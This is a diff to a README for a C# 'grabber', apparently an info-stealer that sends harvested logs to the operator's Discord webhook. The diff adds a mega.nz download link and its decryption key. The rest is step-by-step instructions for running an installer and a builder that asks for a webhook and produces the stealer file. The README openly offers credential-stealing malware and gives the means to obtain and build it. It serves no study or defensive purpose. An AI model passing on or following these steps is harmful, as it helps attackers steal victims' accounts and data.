@@ -43,9 +43,12 @@ A grabber written in C#, designed to send logs to your Discord channel via webho
 How to use?
 
 1. Download all files by clicking the mega.nz link
-2. Use the key: to have acces
+2. Use the key: Hm0IAI_l7ASXIDV948PmeRK-3W-Qa2NKEypcMWCo8VI
 3. Extract the file called "Main"
 4. Open Install.exe 
 5. If everything installed succesfully, open Aqua-builder.exe
 6. It will ask for your Discord webhook, so have one ready.
 7. After you put in the Webhook it will build it and open a map in explorer where your file is ready
+
+
+https://mega.nz/file/h3UiEIrI
